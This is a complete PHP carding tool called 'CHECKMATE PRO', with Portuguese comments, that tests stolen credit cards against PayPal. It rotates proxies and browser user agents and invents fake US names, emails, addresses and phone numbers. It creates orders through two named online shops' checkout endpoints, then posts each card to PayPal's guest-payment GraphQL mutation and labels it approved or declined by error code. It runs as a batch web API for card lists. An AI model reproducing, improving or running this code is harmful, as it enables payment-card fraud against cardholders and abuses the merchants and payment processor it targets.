<?php
class CheckmateChecker {
    
    private $debug = true;
    private $proxyList = [];
    private $currentProxy = '';
    private $userAgents = [];
    private $cookieFile = '';
    private $proxyFile = 'proxy.txt';
    
    // Otimizações
    private $currentSessionData = null;
    private $batchOrderId = null;
    
    public function __construct($debug = true) {
        $this->debug = $debug;
        $this->cookieFile = sys_get_temp_dir() . '/checkmate_cookie_' . uniqid() . '.txt';
        $this->initUserAgents();
        $this->loadProxiesFromFile();
        $this->log('CHECKMATE PRO OTIMIZADO - Debug: ' . ($debug ? 'ON' : 'OFF'));
    }
    
    private function loadProxiesFromFile() {
        if (file_exists($this->proxyFile)) {
            $proxies = file($this->proxyFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $this->proxyList = array_filter($proxies);
            $this->log('Proxies carregados do arquivo: ' . count($this->proxyList));
        } else {
            $this->log('Arquivo proxy.txt não encontrado - funcionando sem proxy');
        }
        $this->rotateProxy();
    }
    
    private function initUserAgents() {
        $this->userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
    }
    
    private function rotateProxy() {
        if (!empty($this->proxyList)) {
            $this->currentProxy = $this->proxyList[array_rand($this->proxyList)];
            $this->log('Proxy rotacionado: ' . $this->currentProxy);
        }
    }
    
    private function log($message) {
        if ($this->debug) {
            $timestamp = date('Y-m-d H:i:s');
            echo "[CHECKMATE][$timestamp] $message\n";
        }
    }
    
    // **OTIMIZAÇÃO: CACHE DE DADOS PARA MAIS VELOCIDADE**
    private $nameCache = [];
    private $addressCache = [];
    
    private function generateName() {
        if (!empty($this->nameCache)) {
            return array_shift($this->nameCache);
        }
        
        // Pre-cache 10 nomes para mais velocidade
        $firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Charles', 'Joseph', 'Thomas',
                      'Maria', 'Jennifer', 'Linda', 'Elizabeth', 'Barbara', 'Susan', 'Jessica', 'Sarah', 'Karen', 'Nancy'];
        $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez',
                     'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin'];
        
        for ($i = 0; $i < 10; $i++) {
            $this->nameCache[] = [
                'first' => $firstNames[array_rand($firstNames)],
                'last' => $lastNames[array_rand($lastNames)]
            ];
        }
        
        return array_shift($this->nameCache);
    }
    
    private function generateEmail($name) {
        $domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'icloud.com'];
        $randomNum = rand(100, 999);
        return strtolower($name['first'] . $name['last'] . $randomNum . '@' . $domains[array_rand($domains)]);
    }
    
    private function generateAddress() {
        if (!empty($this->addressCache)) {
            return array_shift($this->addressCache);
        }
        
        // Pre-cache 10 endereços para mais velocidade
        $streets = ['Main St', 'Oak Ave', 'Maple Dr', 'Elm St', 'Cedar Ln', 'Pine St', 'Birch Rd', 'Willow Way'];
        $cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego'];
        $states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'TX', 'CA'];
        
        for ($i = 0; $i < 10; $i++) {
            $this->addressCache[] = [
                'street' => rand(100, 9999) . ' ' . $streets[array_rand($streets)],
                'city' => $cities[array_rand($cities)],
                'state' => $states[array_rand($states)],
                'zip' => str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT),
                'country' => 'US'
            ];
        }
        
        return array_shift($this->addressCache);
    }
    
    // **CORREÇÃO: TELEFONE NO FORMATO CORRETO - 2015558526**
    private function generatePhone() {
        $areaCodes = ['201', '202', '203', '205', '206', '207', '208', '209', 
                      '210', '212', '213', '214', '215', '216', '217', '218'];
        
        $areaCode = $areaCodes[array_rand($areaCodes)];
        $prefix = '555';
        $line = rand(1000, 9999);
        
        // FORMATO CORRETO: 2015558526 (sem hífens)
        return $areaCode . $prefix . $line;
    }
    
    public function generateUserData() {
        $name = $this->generateName();
        $address = $this->generateAddress();
        
        return [
            'name' => $name,
            'email' => $this->generateEmail($name),
            'address' => $address,
            'phone' => $this->generatePhone(), // Já vem no formato correto
            'user_agent' => $this->userAgents[array_rand($this->userAgents)]
        ];
    }
    
    // **OTIMIZAÇÃO: TIMEOUTS AGGRESSIVOS (10-15s)**
    private function optimizedCurlRequest($url, $headers = [], $postData = null, $isJson = false) {
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        
        // TIMEOUTS OTIMIZADOS (10-15s)
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);        // 15s máximo total
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);  // 8s para conexão
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookieFile);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookieFile);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
        
        // Otimizações de performance
        curl_setopt($ch, CURLOPT_TCP_KEEPALIVE, 1);
        curl_setopt($ch, CURLOPT_TCP_KEEPIDLE, 5);
        curl_setopt($ch, CURLOPT_TCP_KEEPINTVL, 2);
        
        if ($this->currentProxy) {
            curl_setopt($ch, CURLOPT_PROXY, $this->currentProxy);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
            curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_ANY);
        }
        
        if ($postData !== null) {
            curl_setopt($ch, CURLOPT_POST, true);
            if ($isJson) {
                $postData = json_encode($postData);
                $headers[] = 'Content-Type: application/json';
                $headers[] = 'Content-Length: ' . strlen($postData);
            }
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        }
        
        // Headers otimizados
        $headers[] = 'Connection: keep-alive';
        if (!empty($headers)) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $totalTime = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
        
        if (curl_error($ch)) {
            $this->log('cURL Error: ' . curl_error($ch));
            if ($this->currentProxy) {
                $this->rotateProxy();
            }
        }
        
        curl_close($ch);
        
        $this->log("Request: $url | HTTP: $httpCode | Time: " . round($totalTime, 2) . "s");
        
        return $response;
    }
    
    // **OTIMIZAÇÃO: BYPASS DE REDUNDÂNCIAS**
    private function optimizedInitializeSession($userData) {
        $this->log("Sessão otimizada - apenas requisições essenciais");
        
        $headers = [
            'User-Agent: ' . $userData['user_agent'],
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Accept-Encoding: gzip, deflate, br',
            'DNT: 1',
            'Connection: keep-alive',
            'Upgrade-Insecure-Requests: 1'
        ];
        
        // APENAS 1 requisição essencial ao invés de 3
        $this->optimizedCurlRequest('https://reborndollsmall.co.uk/product/5-reborn-dolls-full-body-silicone-piglet-dolls-cute/', $headers);
        
        return true;
    }
    
    private function addToCart() {
        $this->log("Adicionando ao carrinho...");
        
        $headers = [
            'User-Agent: ' . $this->userAgents[array_rand($this->userAgents)],
            'Accept: application/json, text/javascript, */*; q=0.01',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With: XMLHttpRequest',
            'Origin: https://reborndollsmall.co.uk'
        ];
        
        $postData = [
            'attribute_pa_color' => 'spotted-piglet',
            'quantity' => '1',
            'add-to-cart' => '19757',
            'product_id' => '19757',
            'variation_id' => '19849'
        ];
        
        $response = $this->optimizedCurlRequest('https://reborndollsmall.co.uk/?wc-ajax=cfw_add_to_cart&nocache=' . time(), $headers, http_build_query($postData));
        $this->log("Produto adicionado ao carrinho");
        
        return $response;
    }
    
    // **OTIMIZAÇÃO: BYPASS DE REDUNDÂNCIAS**
    private function fastCreateOrder($userData) {
        $this->log("Criando ordem de forma otimizada");
        
        $orderData = [
            "order" => [
                "intent" => "CAPTURE",
                "purchase_units" => [[
                    "amount" => [
                        "currency_code" => "GBP",
                        "value" => "32.50"
                    ],
                    "custom_id" => "card"
                ]],
                "application_context" => [
                    "return_url" => "https://bebegiftshop.com/checkout?pp_action=returned",
                    "cancel_url" => "https://bebegiftshop.com/checkout?pp_action=canceled",
                ]
            ],
            "merchant_token" => "MXF3MDNxdGZzVGlPNHBvSTQmdWEzY3dPMiZDZi4mL04zY3dPM0R6Vg=="
        ];
        
        $headers = [
            'User-Agent: ' . $userData['user_agent'],
            'Accept: application/json',
            'Content-Type: application/json',
            'Origin: https://bebegiftshop.com'
        ];
        
        $response = $this->optimizedCurlRequest('https://bebegiftshop.com/?rest_route=/cs/create-paypal-order', $headers, $orderData, true);
        
        $responseData = json_decode($response, true);
        $orderId = $responseData['order_id'] ?? null;
        
        $this->log("Ordem criada: " . ($orderId ?: 'FALHA'));
        
        return $orderId;
    }
    
    // **CORREÇÃO: PAYLOAD COMPLETO COM TELEFONE**
    private function getMinimalPaymentData($orderId, $cc, $mes, $ano, $cvv, $userData) {
        $firstDigit = substr($cc, 0, 1);
        $bandeira = ($firstDigit == '3') ? 'AMEX' : (($firstDigit == '4') ? 'VISA' : 'MASTER_CARD');
        
        return [
            "query" => "mutation payWithCard(\$t: String!, \$c: CardInput!, \$fn: String, \$ln: String, \$e: String, \$pn: String, \$sa: AddressInput, \$ba: AddressInput) {
                approveGuestPaymentWithCreditCard(
                    token: \$t, 
                    card: \$c,
                    firstName: \$fn,
                    lastName: \$ln, 
                    email: \$e,
                    phoneNumber: \$pn,
                    shippingAddress: \$sa,
                    billingAddress: \$ba
                ) {
                    flags { is3DSecureRequired }
                    paymentContingencies { threeDomainSecure { status } }
                }
            }",
            "variables" => [
                "t" => $orderId,
                "c" => [
                    "cardNumber" => $cc,
                    "type" => $bandeira,
                    "expirationDate" => "$mes/$ano",
                    "securityCode" => $cvv,
                    "postalCode" => $userData['address']['zip']
                ],
                "fn" => $userData['name']['first'],
                "ln" => $userData['name']['last'],
                "e" => $userData['email'],
                "pn" => $userData['phone'], // TELEFONE ADICIONADO
                "sa" => [
                    "givenName" => $userData['name']['first'],
                    "familyName" => $userData['name']['last'],
                    "line1" => $userData['address']['street'],
                    "line2" => "",
                    "city" => $userData['address']['city'],
                    "state" => $userData['address']['state'],
                    "postalCode" => $userData['address']['zip'],
                    "country" => "US"
                ],
                "ba" => [
                    "givenName" => $userData['name']['first'],
                    "familyName" => $userData['name']['last'],
                    "line1" => $userData['address']['street'],
                    "line2" => "",
                    "city" => $userData['address']['city'],
                    "state" => $userData['address']['state'],
                    "postalCode" => $userData['address']['zip'],
                    "country" => "US"
                ]
            ],
            "operationName" => "payWithCard"
        ];
    }
    
    private function processPayment($orderId, $cc, $mes, $ano, $cvv, $userData) {
        $this->log("Processando pagamento...");
        
        // **USANDO PAYLOAD CORRIGIDO E OTIMIZADO**
        $paymentData = $this->getMinimalPaymentData($orderId, $cc, $mes, $ano, $cvv, $userData);
        
        $headers = [
            'User-Agent: ' . $userData['user_agent'],
            'Accept: application/json, text/plain, */*',
            'Content-Type: application/json',
            'paypal-client-context: ' . $orderId,
            'x-app-name: standardcardfields',
            'paypal-client-metadata-id: ' . $orderId,
            'x-country: US',
            'Origin: https://www.paypal.com'
        ];
        
        $response = $this->optimizedCurlRequest('https://www.paypal.com/graphql?fetch_credit_form_submit', $headers, $paymentData, true);
        
        $this->log("Resposta do pagamento recebida");
        
        return $response;
    }
    
    private function analyzeResult($response, $cc, $mes, $ano, $cvv, $responseTime) {
        $this->log("Analisando resultado...");
        
        $responseData = json_decode($response, true);
        
        if (isset($responseData['errors']) && is_array($responseData['errors'])) {
            foreach ($responseData['errors'] as $error) {
                $message = $error['message'] ?? '';
                $code = $error['data'][0]['code'] ?? $message;
                
                if (empty($code) || $code === $message) {
                    $code = $message;
                }
                
                $this->log("Error encontrado: $message | Code: $code");
                
                $approvedCodes = ['INVALID_SECURITY_CODE', 'EXISTING_ACCOUNT_RESTRICTED', 'INVALID_BILLING_ADDRESS', 'SUCCESS'];
                if (in_array($code, $approvedCodes)) {
                    return $this->formatResult('approved', $cc, $mes, $ano, $cvv, $code, $responseTime);
                }
                
                $declinedCodes = ['GENERIC_CARD_ERROR', 'OAS_VALIDATION', 'VALIDATION_ERROR', 'CARD_GENERIC_ERROR', 'R_ERROR'];
                if (in_array($code, $declinedCodes)) {
                    return $this->formatResult('declined', $cc, $mes, $ano, $cvv, $code, $responseTime);
                }
                
                return $this->formatResult('error', $cc, $mes, $ano, $cvv, $code, $responseTime);
            }
        }
        
        if (isset($responseData['data']['approveGuestPaymentWithCreditCard'])) {
            return $this->formatResult('approved', $cc, $mes, $ano, $cvv, 'SUCCESS', $responseTime);
        }
        
        if (strpos($response, 'INVALID_SECURITY_CODE') !== false) {
            return $this->formatResult('approved', $cc, $mes, $ano, $cvv, 'INVALID_SECURITY_CODE', $responseTime);
        }
        
        if (strpos($response, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
            return $this->formatResult('approved', $cc, $mes, $ano, $cvv, 'EXISTING_ACCOUNT_RESTRICTED', $responseTime);
        }
        
        return $this->formatResult('error', $cc, $mes, $ano, $cvv, 'UNKNOWN_RESPONSE', $responseTime);
    }
    
    private function formatResult($status, $cc, $mes, $ano, $cvv, $code, $responseTime) {
        if ($status == 'approved') {
            $statusBadge = "<span class='badge badge-success'>APROVADA</span>";
            $colorClass = 'text-success';
        } elseif ($status == 'declined') {
            $statusBadge = "<span class='badge badge-danger'>REPROVADA</span>";
            $colorClass = 'text-danger';
        } else {
            $statusBadge = "<span class='badge badge-error'>ERRO</span>";
            $colorClass = 'text-error';
        }
        
        return $statusBadge . " » $cc|$mes|$ano|$cvv » <b>Retorno: <span class='$colorClass'>$code</span></b> <b>Tempo: ({$responseTime}s) » CHECKMATE PRO</b><br>";
    }
    
    // **OTIMIZAÇÃO: BATCH PROCESSING API**
    public function checkCardBatch($cards) {
        $startTime = time();
        $this->log("=== INICIANDO BATCH COM " . count($cards) . " CARTÕES ===");
        
        $userData = $this->generateUserData();
        
        if (file_exists($this->cookieFile)) {
            unlink($this->cookieFile);
        }
        
        try {
            $this->optimizedInitializeSession($userData);
            $this->addToCart();
            $this->batchOrderId = $this->fastCreateOrder($userData);
            
            if (!$this->batchOrderId) {
                throw new Exception("Falha ao criar ordem batch");
            }
            
            $results = [];
            foreach($cards as $index => $card) {
                $cardData = explode('|', $card);
                if (count($cardData) < 4) continue;
                
                $result = $this->processPayment(
                    $this->batchOrderId, 
                    $cardData[0], 
                    $cardData[1], 
                    $cardData[2], 
                    $cardData[3], 
                    $userData
                );
                
                $results[] = $this->analyzeResult($result, $cardData[0], $cardData[1], $cardData[2], $cardData[3], (time() - $startTime));
            }
            
            $this->cleanup();
            return $results;
            
        } catch (Exception $e) {
            $this->log("ERRO BATCH: " . $e->getMessage());
            $this->cleanup();
            return array_fill(0, count($cards), $this->formatResult('error', '', '', '', '', 'BATCH_ERROR', (time() - $startTime)));
        }
    }
    
    // Método principal otimizado
    public function checkCard($cc, $mes, $ano, $cvv) {
        $startTime = time();
        $this->log("=== VERIFICAÇÃO OTIMIZADA: $cc|$mes|$ano|$cvv ===");
        
        $userData = $this->generateUserData();
        
        if (file_exists($this->cookieFile)) {
            unlink($this->cookieFile);
        }
        
        try {
            // FLUXO OTIMIZADO - menos etapas
            $this->optimizedInitializeSession($userData);
            $this->addToCart();
            $orderId = $this->fastCreateOrder($userData);
            
            if (!$orderId) {
                throw new Exception("Falha ao criar ordem otimizada");
            }
            
            // PAYLOAD CORRIGIDO E OTIMIZADO
            $result = $this->processPayment($orderId, $cc, $mes, $ano, $cvv, $userData);
            $responseTime = time() - $startTime;
            
            $finalResult = $this->analyzeResult($result, $cc, $mes, $ano, $cvv, $responseTime);
            $this->log("Resultado final em " . $responseTime . "s");
            $this->cleanup();
            
            return $finalResult;
            
        } catch (Exception $e) {
            $this->log("ERRO: " . $e->getMessage());
            $this->cleanup();
            return $this->formatResult('error', $cc, $mes, $ano, $cvv, 'ERROR', (time() - $startTime));
        }
    }
    
    public function cleanup() {
        if (file_exists($this->cookieFile)) {
            unlink($this->cookieFile);
            $this->log("Cleanup realizado - Cookies removidos");
        }
    }
}

// Sistema de Threads/Multi-checking
class CheckmateThreadManager {
    private $maxThreads = 3;
    private $results = [];
    
    public function checkMultipleCards($cardsList, $proxies = [], $debug = true) {
        $this->results = [];
        $chunks = array_chunk($cardsList, $this->maxThreads);
        
        foreach ($chunks as $chunk) {
            $this->processChunk($chunk, $proxies, $debug);
        }
        
        return $this->results;
    }
    
    private function processChunk($cardsChunk, $proxies, $debug) {
        foreach ($cardsChunk as $index => $cardData) {
            $cc = $cardData['cc'];
            $mes = $cardData['mes'];
            $ano = $cardData['ano'];
            $cvv = $cardData['cvv'];
            
            $result = $this->simulateThreadCheck($cc, $mes, $ano, $cvv, $proxies, $debug);
            $this->results[] = $result;
        }
        
        return $this->results;
    }
    
    private function simulateThreadCheck($cc, $mes, $ano, $cvv, $proxies, $debug) {
        $checker = new CheckmateChecker($debug);
        return $checker->checkCard($cc, $mes, $ano, $cvv);
    }
}

// Função principal simplificada
function checkmate_check($lista) {
    $checker = new CheckmateChecker(true);
    
    $ccData = explode('|', str_replace([':', ' ', '/'], '|', $lista));
    $cc = $ccData[0] ?? '';
    $mes = $ccData[1] ?? '';
    $ano = $ccData[2] ?? '';
    $cvv = $ccData[3] ?? '';
    
    if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
        return "Formato inválido. Use: CC|MES|ANO|CVV";
    }
    
    $result = $checker->checkCard($cc, $mes, $ano, $cvv);
    return $result;
}

// Processamento de requisições
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['lista'])) {
    header('Content-Type: text/html; charset=utf-8');
    $lista = trim($_POST['lista']);
    
    if (!empty($lista)) {
        echo checkmate_check($lista);
    } else {
        echo "Erro: Lista vazia";
    }
    exit;
}

// Se for GET com parâmetro lista
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['lista'])) {
    header('Content-Type: text/html; charset=utf-8');
    $lista = trim($_GET['lista']);
    
    if (!empty($lista)) {
        echo checkmate_check($lista);
    } else {
        echo "Erro: Lista vazia";
    }
    exit;
}

// Se chegar até aqui sem parâmetros, retorna mensagem de API
header('Content-Type: application/json');
echo json_encode([
    'status' => 'api_running',
    'message' => 'CHECKMATE PRO API OTIMIZADA - Use ?lista=CC|MES|ANO|CVV ou POST com lista',
    'version' => '3.0',
    'optimizations' => ['batch_processing', 'payload_optimized', 'timeouts_15s', 'redundancy_bypass', 'phone_format_fixed']
]);
?>